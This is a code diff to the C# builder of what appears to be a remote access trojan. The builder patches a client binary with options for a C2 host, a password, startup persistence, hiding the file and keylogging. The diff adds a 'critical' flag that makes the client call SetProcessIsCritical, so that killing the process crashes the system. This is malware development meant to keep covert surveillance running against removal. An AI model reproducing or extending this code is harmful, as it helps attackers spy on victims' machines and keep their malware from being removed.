@@ -28,6 +28,7 @@ namespace xServer.Core.Build
         /// <param name="startup">Determines whether to add the program to startup.</param>
         /// <param name="hidefile">Determines whether to hide the file.</param>
         /// <param name="keylogger">Determines if keylogging functionality should be activated.</param>
+        /// <param name="critical">Determines if SetProcessIsCritical should be activated.</param>
         /// <param name="reconnectdelay">The amount the client will wait until attempting to reconnect.</param>
         /// <param name="installpath">The installation path of the client.</param>
         /// <param name="iconpath">The path to the icon for the client.</param>
@@ -37,7 +38,7 @@ namespace xServer.Core.Build
         /// <exception cref="System.ArgumentException">Thrown if an invalid special folder was specified.</exception>
         /// <exception cref="System.IO.FileLoadException">Thrown if the client binaries do not exist.</exception>
         public static void Build(string output, string tag, string host, string password, string installsub, string installname,
-            string mutex, string startupkey, bool install, bool startup, bool hidefile, bool keylogger,
+            string mutex, string startupkey, bool install, bool startup, bool hidefile, bool keylogger, bool critical,
             int reconnectdelay,
             int installpath, string iconpath, string[] asminfo, string version)
         {
@@ -115,6 +116,9 @@ namespace xServer.Core.Build
                                             break;
                                         case 4: //Keylogger
                                             methodDef.Body.Instructions[i] = Instruction.Create(BoolOpcode(keylogger));
+                                            break;
+                                        case 5: //Critical
+                                            methodDef.Body.Instructions[i] = Instruction.Create(BoolOpcode(critical));
                                             break;
                                     }
                                     bools++;
